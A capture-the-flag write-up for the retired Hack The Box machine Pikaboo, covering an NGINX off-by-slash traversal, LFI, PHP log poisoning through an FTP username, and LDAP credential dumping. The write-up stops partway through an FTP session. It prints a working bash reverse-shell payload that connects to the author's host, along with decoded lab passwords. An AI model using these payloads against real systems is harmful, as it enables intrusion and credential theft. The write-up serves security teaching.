---
title: HTB: Pikaboo
url: https://0xdf.gitlab.io/2021/12/04/htb-pikaboo.html
date: 2021-12-04T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-pikaboo, hackthebox, nmap, debian, feroxbuster, off-by-slash, lfi, log-poisoning, perl-diamond-injection, perl, open-injection, open-injection-perl, ldap, ldapsearch, htb-seal, breaking-parser-logic, oscp-plus-v2
---

![Pikaboo](https://0xdfimages.gitlab.io/img/pikaboo-cover.png)

Pikaboo required a lot of enumeration and putting together different pieces to get through each step. I’ll only ever get a shell as www-data and root, but for each step there’s several pieces to pull together and combine to some effect. I’ll start by abusing an off-by-slash vulnerability in the interaction between NGINX and Apache to get access to a staging server. In there, I’ll use an LFI to include FTP logs, which I can poison with PHP to get execution. As www-data, I’ll find a cron running a Perl script as root, which is vulnerable to command injection via the diamond operator. I’ll find creds for another user in LDAP and get access to FTP, where I can drop a file that will be read and give execution to get a shell as root.

## Box Info

| Name | [Pikaboo](https://hackthebox.com/machines/pikaboo)  [Pikaboo](https://hackthebox.com/machines/pikaboo) [Play on HackTheBox](https://hackthebox.com/machines/pikaboo) |
| --- | --- |
| Release Date | [17 Jul 2021](https://twitter.com/hackthebox_eu/status/1415671577748799584) |
| Retire Date | 04 Dec 2021 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Pikaboo |
| Radar Graph | Radar chart for Pikaboo |
| First Blood User | 01:40:48[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 03:00:15[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creators | [pwnmeow pwnmeow](https://app.hackthebox.com/users/157669)  [polarbearer polarbearer](https://app.hackthebox.com/users/159204) |

## Recon

### nmap

`nmap` found three open TCP ports, FTP (21), SSH (22), and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.249
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 15:10 EDT
Nmap scan report for 10.10.10.249
Host is up (0.095s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 171.09 seconds

oxdf@parrot$ nmap -p 21,22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.249
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 15:13 EDT
Nmap scan report for 10.10.10.249
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 10 Buster.

### FTP - TCP 21

`nmap` would usually flag if anonymous access was allowed, but I’ll confirm manually:

```

oxdf@parrot$ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:oxdf): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.

```

I’ll come back if I find creds.

### Website - TCP 80

#### Site

The site is a “Pokatmon” collectors site (clearly a Pokemon imitator):

[![image-20210707114334439](https://0xdfimages.gitlab.io/img/image-20210707114334439.png)](https://0xdfimages.gitlab.io/img/image-20210707114334439.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210707114334439.png)

There are three links on the page. Pokatdex (`/pokatdex.php`) gives a bunch of monster images and stats:

![image-20210707115043587](https://0xdfimages.gitlab.io/img/image-20210707115043587.png)

Clicking on any of the monsters loads a page that says PokeAPI Integration is coming soon:

![image-20210707115136899](https://0xdfimages.gitlab.io/img/image-20210707115136899.png)

[PokeAPI](https://pokeapi.co/) is a RESTful API for querying details about Pokemon characters / cards.

The contact link (`contact.php`) presents a form:

![image-20210707115206079](https://0xdfimages.gitlab.io/img/image-20210707115206079.png)

The button on this page doesn’t seem to actually submit any requests.

The admin link (`/admin`) pops HTTP auth:

![image-20210707115345210](https://0xdfimages.gitlab.io/img/image-20210707115345210.png)

Nothing I guessed allowed access, and on hitting Cancel, there’s an Unauthorized page:

![image-20210707115430373](https://0xdfimages.gitlab.io/img/image-20210707115430373.png)

#### Tech Stack

From the links above it’s clear this site is running on PHP. Visiting `/index.php` confirms that as well, as the same page as `/` is displayed.

The HTTP response headers show nothing too useful beyond the nginx version:

```

HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 17 Jul 2021 19:08:15 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 6922
Connection: close
Vary: Accept-Encoding

```

It’s interesting to note that the Unauthorized page above shows Apache running on 127.0.0.1:81, so it seems likely that NGINX is reverse-proxying the requests to Apache.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.249 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.249
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml   
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
401       14l       54w      456c http://10.10.10.249/adminnew
401       14l       54w      456c http://10.10.10.249/adminnew.php                
401       14l       54w      456c http://10.10.10.249/admin_area         
401       14l       54w      456c http://10.10.10.249/admin_area.php
401       14l       54w      456c http://10.10.10.249/admin_online
401       14l       54w      456c http://10.10.10.249/admin_online.php
401       14l       54w      456c http://10.10.10.249/administracja
401       14l       54w      456c http://10.10.10.249/administracja.php
401       14l       54w      456c http://10.10.10.249/admin_news
401       14l       54w      456c http://10.10.10.249/admin_news.php
401       14l       54w      456c http://10.10.10.249/admin
401       14l       54w      456c http://10.10.10.249/admin_images
403        9l       28w      274c http://10.10.10.249/admin.php
401       14l       54w      456c http://10.10.10.249/admin_images.php
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_10_249-1625673358.state ...   
[###>----------------] - 20s    10676/59998   1m      found:37      errors:0      
[###>----------------] - 20s    10650/59998   507/s   http://10.10.10.249

```

I had to kill this mid-run, as it seems that any path starting with `/admin` seems to be returning this 401 Unauthorized, except for `admin.php`, which is returning 403 Forbidden:

```

oxdf@parrot$ curl -I http://10.10.10.249/admincms.php
HTTP/1.1 401 Unauthorized
Server: nginx/1.14.2
Date: Wed, 07 Jul 2021 16:02:50 GMT
Content-Type: text/html; charset=iso-8859-1
Connection: keep-alive
WWW-Authenticate: Basic realm="Authentication Required"

oxdf@parrot$ curl -I http://10.10.10.249/admin.php
HTTP/1.1 403 Forbidden
Server: nginx/1.14.2
Date: Wed, 07 Jul 2021 16:02:55 GMT
Content-Type: text/html; charset=iso-8859-1
Connection: keep-alive
Vary: Accept-Encoding

```

I’ll re-run `feroxbuster` filtering out 401 responses with `-C 401`:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.249 -x php -C 401

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.249
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💢  Status Code Filters   │ [401]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      319c http://10.10.10.249/images
200       92l      213w     3180c http://10.10.10.249/contact.php
200      208l      477w     6922c http://10.10.10.249/index.php
403        9l       28w      274c http://10.10.10.249/admin.php
[####################] - 2m    119996/119996  0s      found:4       errors:0      
[####################] - 1m     59998/59998   511/s   http://10.10.10.249
[####################] - 1m     59998/59998   512/s   http://10.10.10.249/images

```

Nothing new here beyond what I already found.

## Shell as www-data

### Access Admin Panel

#### Off By Slash

Orange Tsai has a [great presentation on web server misconfigurations](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf), and the Off By Slash section starts at slide 17. This presentation is the same one I referenced in solving [Seal](/2021/11/13/htb-seal.html#access-tomcat-manager), but a different technique/use-case. I’ll show an example from [this post](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/). The idea is that if NGINX has a config that looks like this:

```

location /i {
    alias /data/w3/images/;
}

```

When someone visits `/i../app/config.py`, NGINX will rewrite that to `/data/w3/images/../app/config.py`, thus providing directory traversal.

In this example, I know there’s some kind of rule that’s re-writing `/admin`, and i know there’s no trailing slash or else something like `/adminnew` wouldn’t be re-written. So I can guess that the config looks something like:

```

location /admin {
	proxy_pass http://localhost:[port apache is listening on]/[more path?]/
}

```

My request to `/admin.php` would then end up at `http://localhost:[port]/[path]/.php`, which explains why it’s behaving differently from the other proxied stuff.

To test this, I can look up a directory and see if there’s an `index.php` or `index.html`, but no luck:

```

oxdf@parrot$ curl -I http://10.10.10.249/admin../index.php
HTTP/1.1 404 Not Found
Server: nginx/1.14.2
Date: Sat, 17 Jul 2021 19:19:51 GMT
Content-Type: text/html; charset=iso-8859-1
Connection: keep-alive
Vary: Accept-Encoding

oxdf@parrot$ curl -I http://10.10.10.249/admin../index.html
HTTP/1.1 404 Not Found
Server: nginx/1.14.2
Date: Sat, 17 Jul 2021 19:19:58 GMT
Content-Type: text/html; charset=iso-8859-1
Connection: keep-alive
Vary: Accept-Encoding

```

Tricks to get back to `/admin` don’t help anything:

```

oxdf@parrot$ curl -I http://10.10.10.249/admin../admin
HTTP/1.1 401 Unauthorized
Server: nginx/1.14.2
Date: Sat, 17 Jul 2021 19:20:17 GMT
Content-Type: text/html; charset=iso-8859-1
Connection: keep-alive
WWW-Authenticate: Basic realm="Authentication Required"

```

I took a guess that perhaps I could access the pokatdex part of the site, if it were being served out of a folder named `pokatdex` in the same folder as the admin page, and it worked:

```

oxdf@parrot$ curl -I http://10.10.10.249/admin../pokatdex/
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 17 Jul 2021 19:20:27 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding

oxdf@parrot$ curl -I http://10.10.10.249/admin../pokatdex/contact.php
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 17 Jul 2021 19:20:32 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding

```

Still, while that verifies I’m thinking about the configuration right, there’s not much I can do with that.

Thinking about what else might be being served by Apache, I tried looking for `server-status`. This is typically only accessible from localhost, but given the NGINX proxy, the request will be coming from localhost. Trying to hit the page directly doesn’t work (it would have been found by `feroxbuster`):

```

oxdf@parrot$ curl -I http://10.10.10.249/server-status
HTTP/1.1 404 Not Found
Server: nginx/1.14.2
Date: Tue, 30 Nov 2021 22:22:40 GMT
Content-Type: text/html; charset=iso-8859-1
Connection: keep-alive
Vary: Accept-Encoding

```

If I try to request the page with a `/../`, it doesn’t work:

```

oxdf@parrot$ curl -I http://10.10.10.249/admin/../server-status
HTTP/1.1 404 Not Found
Server: nginx/1.14.2
Date: Sat, 17 Jul 2021 19:21:02 GMT
Content-Type: text/html; charset=iso-8859-1
Connection: keep-alive
Vary: Accept-Encoding

```

But using the off by slash, it does:

```

oxdf@parrot$ curl -I http://10.10.10.249/admin../server-status
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 17 Jul 2021 19:21:18 GMT
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 6242
Connection: keep-alive
Vary: Accept-Encoding
Vary: Accept-Encoding

```

In Firefox:

![image-20210707131731884](https://0xdfimages.gitlab.io/img/image-20210707131731884.png)

In addition to seeing the urls I’ve been visiting, there’s also one at the top that is interesting, `/admin_staging`. This page also shows that Apache is listening on TCP 81 on localhost.

#### Admin Staging

Visiting `10.10.10.249/admin../admin_staging` actually returned a HTTP redirect to `http://127.0.0.1:81/admin_staging/`, which then fails because I can’t connect to localhost:81. It took me a minute to figure out what was going on here. The request is passed by NGINX to `http://127.0.0.1:81/admin/../admin_staging`. But because this is a directory, it returns a 301 to the url with a `/` on the end (and normalizes it to `/admin_staging` in the process).

Visiting `http://10.10.10.249/admin../admin_staging/` returns a new dashboard:

[![image-20210707132900010](https://0xdfimages.gitlab.io/img/image-20210707132900010.png)](https://0xdfimages.gitlab.io/img/image-20210707132900010.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210707132900010.png)

The different links on the side lead to information that doesn’t seem useful. But the URL structure is interesting. For example, User Profile leads to `http://10.10.10.249/admin../admin_staging/index.php?page=user.php`.

### LFI

This is not an uncommon pattern in PHP pages, and suggests a potential file inclusion. And, because the page parameter includes `.php` on the end, it is likely I can read files that are not just PHP files. A more secure way to do this would be to have `page=user` and then append `.php` to the input in the PHP before including it.

Unfortunately, I can’t seem to read `/etc/passwd`:

![image-20210707133915976](https://0xdfimages.gitlab.io/img/image-20210707133915976.png)

Before giving up, I checked something more local, and it worked:

![image-20210707134119419](https://0xdfimages.gitlab.io/img/image-20210707134119419.png)

I included the contact page and it is displayed in that space.

It seems like I can read within the current directory, and up one level, but not all the way to root.

It’s fair to guess that the sites are running out folders in `/var/www` or maybe `/var/www/html`. If that’s the case, I can’t think of any default folders I can check in `/var/www`, but I can try to access things in `/var/`. On my own host, I’ll run `find /var/ -type f -perm -o=r 2>/dev/null` to look for world readable files in `/var`. There are a ton, and I’ll look through them to find ones that might be on PikaBoo as well. I tried `/var/log/dpkg.log`. It didn’t show up at `page=../../log/dpkg.log`, but at `page=../../../log/dpkg.log`:

![image-20210707134842647](https://0xdfimages.gitlab.io/img/image-20210707134842647.png)

Interestingly, that access was taken right after release. In checking the box for this post just before it retires, `dpkg.log` is still there, but it’s 0 bytes (due to rotation of logs). Still, `dpkg.log.1` is there with the same contents.

Either the admin staging panel is running out of `/var/www/admin_staging/` and then the included pages are in another directory, or the admin staging panel is running out of `/var/www/[something]/admin_staging`. Either way, I can read files in `/var`, but not in `/etc` (I verified with a few other checks, like `/etc/issue`).

One weird thing - I am not able to access the Apache logs, `access.log` or `error.log` in `/var/log/apache2`. Perhaps they are in a non-default location, or the webserver lacks read access, or they are just empty.

### Log Poisoning

Log poisoning is a great attack against an LFI, but without the Apache logs, it doesn’t seem possible. But what about FTP? VSFTPd logs [are stored in](https://askubuntu.com/questions/829938/vsftpd-log-file-location) `/var/log/vsftpd.log`. It shows logs via the LFI, with logs from July (likely when the box was developed/tested):

![image-20211130175417591](https://0xdfimages.gitlab.io/img/image-20211130175417591.png)

I can try to log in with FTP, and the new login shows up as well:

![image-20211130175556231](https://0xdfimages.gitlab.io/img/image-20211130175556231.png)

Not only are attempts logged, but the username is in the logs.

I tried another failed login:

```

oxdf@parrot$ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:oxdf): <?php system('id'); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 

```

On refreshing the page with the logs in LFI, I have code execution:

![image-20211021063650139](https://0xdfimages.gitlab.io/img/image-20211021063650139.png)

### Shell

To get a shell, I logged into FTP again:

```

oxdf@parrot$ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:oxdf): <?php system('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 

```

With `nc` listening, I refreshed the log page:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.249] 49566
bash: cannot set terminal process group (645): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pikaboo:/var/www/html/admin_staging$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I can grab `user.txt` from the only home directory on the host:

```

www-data@pikaboo:/home/pwnmeow$ cat user.txt
23b4217f************************

```

And upgraded the shell:

```

www-data@pikaboo:/var/www/html/admin_staging$ python3 -c 'import pty;pty.spawn("bash")'
<_staging$ python3 -c 'import pty;pty.spawn("bash")'
www-data@pikaboo:/var/www/html/admin_staging$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@pikaboo:/var/www/html/admin_staging$ 

```

## Shell as root

### Enumeration

#### cron

In poking around the file system, there’s a job that runs from `/etc/crontab as root` every minute:

```

www-data@pikaboo:/var/www$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron

```

The file is a short Bash script:

```

#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done

```

It will loop over directories in `/srv/ftp`, and for each change into them and then call `csvupdate [dir name] *.csv`. It will then remove all the files in that directory.

There are a ton of folders in `/srv/ftp`:

```

www-data@pikaboo:/srv/ftp$ ls -l
total 696
drwx-wx--- 2 root ftp 4096 May 20 09:54 abilities
drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_changelog
drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_changelog_prose
drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_flavor_text
drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_names
drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_prose
drwx-wx--- 2 root ftp 4096 May 20 08:01 berries
drwx-wx--- 2 root ftp 4096 May 20 08:01 berry_firmness
drwx-wx--- 2 root ftp 4096 May 20 08:01 berry_firmness_names
...[snip]...
www-data@pikaboo:/srv/ftp$ ls -1 | wc -l
174

```

www-data doesn’t have any access to any of the folders, only root and the `ftp` group.

#### csvupdate - Analysis

`csvupdate` is a Perl script:

```

www-data@pikaboo:/$ file /usr/local/bin/csvupdate
/usr/local/bin/csvupdate: Perl script text executable

```

The script is long, and the comments indicate it’s designed to update the PokeAPI with the data uploaded from FTP:

```

#!/usr/bin/perl

##################################################################
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #
#                                                                #
# Usage:                                                         #
# ./csvupdate <type> <file(s)>                                   #
#                                                                #
# Arguments:                                                     #
# - type: PokeAPI CSV file type                                  #
#         (must have the correct number of fields)               #
# - file(s): list of files containing CSV data                   #
##################################################################
                                                    
use strict;
use warnings;
use Text::CSV;

my $csv_dir = "/opt/pokeapi/data/v2/csv"; 

my %csv_fields = (            
  'abilities' => 4,                    
  'ability_changelog' => 3,                  
  'ability_changelog_prose' => 3,
  'ability_flavor_text' => 4, 
  'ability_names' => 3,                       
  'ability_prose' => 4,            
  'berries' => 10,                               
  'berry_firmness' => 2,
...[snip]...
  'version_groups' => 4,
  'version_names' => 3,
  'versions' => 3
);

if($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);

```

Perl is a super confusing language to read, especially with things like the [diamond operator](https://perlmaven.com/the-diamond-operator), and the fact that variable types use different characters to indicate they are variables. For example `$` indicates a scaler (like `$csv_dir` or `$ARGV[0]`), `@` indicates an array (like `@ARGV`), and `%` indicates a hash table (like a Python dictionary, like `%csv_fields`).

After defining `$csv_dir` and `%csv_fields`, it checks the length of the args (`$#ARGV`). If it’s less than one, it prints the usage and exits.

Then it reads the first arg (`$ARG[0]` (Perl doesn’t store the calling program name in `@ARGS`)), and checks that it is on of the keys defined in `%csv_fields`. Each of the folders in `/srv/ftp` match up to parameters defined in this dictionary. If that’s ok, it opens an output `.csv` file with a handle `$fh`.

`shift` [with no args](https://perlmaven.com/shift) will remove the first item from `@ARGV`, leaving just `*.csv`, which will be expanded to be all the `.csv` files in the directory.

`for(<>)` will open each of those files one by one, and loop over each line in each of those files, saving the line into the implied variable, `$_`. `chomp` will remove any whitespace from the end of that line and save the update in `$_`. Assuming the number of fields matches what’s in the hash table (dictionary), it will print that output to the file.

#### pokeapi

The script references updating data in `/opt/pokeapi/data/v2/csv`. I’ll check out the `/opt/pokeapi` directory:

```

www-data@pikaboo:/opt/pokeapi$ ls
CODE_OF_CONDUCT.md  README.md         data                pokemon_v2
CONTRIBUTING.md     Resources         docker-compose.yml  requirements.txt
CONTRIBUTORS.txt    __init__.py       graphql             test-requirements.txt
LICENSE.md          apollo.config.js  gunicorn.py.ini
Makefile            config            manage.py

```

The `config` directory might be interesting:

```

www-data@pikaboo:/opt/pokeapi/config$ ls
__init__.py  docker-compose.py  local.py     urls.py
__pycache__  docker.py          settings.py  wsgi.py

```

`settings.py` defines a `DATABASES` dictionary:

```

DATABASES = {                                       
    "ldap": {                      
        "ENGINE": "ldapdb.backends.ldap",           
        "NAME": "ldap:///", 
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },                                              
    "default": {              
        "ENGINE": "django.db.backends.sqlite3",     
        "NAME": "/opt/pokeapi/db.sqlite3",
    }    
}   

```

The DB is SQLite, but there’s also LDAP creds.

#### ldap

`netstat` shows that in addition to the ports already observed, 389 is also listening locally, which is typically LDAP:

```

www-data@pikaboo:/$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      567/nginx: worker p 
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      567/nginx: worker p

```

Just like I have on many occasions remotely enumerated LDAP, I can try `ldapsearch` from PikaBoo:

```

www-data@pikaboo:/$ ldapsearch -h 127.0.0.1 -x -s base namingcontexts
ldap_bind: Inappropriate authentication (48)
        additional info: anonymous bind disallowed

```

It requires auth. I’ve got the creds from the PokeAPI, and they work:

```

www-data@pikaboo:/var/www$ ldapsearch -h 127.0.0.1 -x -s base namingcontexts -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g'
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: dc=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

The DC is HTB. I’ll use that and dump everything under it:

```

www-data@pikaboo:/var/www$ ldapsearch -h 127.0.0.1 -x -b 'dc=htb' -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g'            
# extended LDIF
#
# LDAPv3
# base <dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb
dn: dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: htb
dc: htb

# admin, htb
dn: cn=admin,dc=htb
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: e1NTSEF9bWxhdFNUTzJDZjZ6QjdVL2VyOVBUamtBVE5yZnJiVnE=

# users, htb
dn: ou=users,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, htb
dn: ou=groups,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pikaboo.htb
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

# ftp.pikaboo.htb
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

# users, pikaboo.htb
dn: ou=users,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# pokeapi.pikaboo.htb
dn: dc=pokeapi,dc=pikaboo,dc=htb
objectClass: domain
dc: pokeapi

# users, ftp.pikaboo.htb
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.pikaboo.htb
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

# binduser, users, pikaboo.htb
dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw==

# users, pokeapi.pikaboo.htb
dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, pokeapi.pikaboo.htb
dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# search result
search: 2
result: 0 Success

# numResponses: 15
# numEntries: 14

```

There are three objects with `userPassword` fields filled in. admin’s decodes to a string starting with `{SSHA}`, which indicates the rest of the string is a salted SHA1 hash of the password in base64:

```

oxdf@parrot$ echo "e1NTSEF9bWxhdFNUTzJDZjZ6QjdVL2VyOVBUamtBVE5yZnJiVnE=" | base64 -d
{SSHA}mlatSTO2Cf6zB7U/er9PTjkATNrfrbVq

```

I can convert that to a typical 40-character hex view with `base64` and `xxd`:

```

oxdf@parrot$ echo "mlatSTO2Cf6zB7U/er9PTjkATNrfrbVq" | base64 -d | xxd -p
9a56ad4933b609feb307b53f7abf4f4e39004cdadfadb56a

```

I could try to crack that, but I’ll look at the others first. binduser’s isn’t hashed, but it matches the password I already know and used to dump the DB:

```

oxdf@parrot$ echo "Sn40MiVXP1BGSGxdZw==" | base64 -d
J~42%W?PFHl]g

```

pwnmeow’s is also not hashed, and is new:

```

oxdf@parrot$ echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d
_G0tT4_C4tcH_'3m_4lL!_

```

#### FTP Access

That password doesn’t work for the pwnmeow user on the box with `su` or `ssh`. But it does work for FTP:

```

oxdf@parrot$ ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:oxdf): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

The directory contains the same folders as in `/srv/ftp`:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
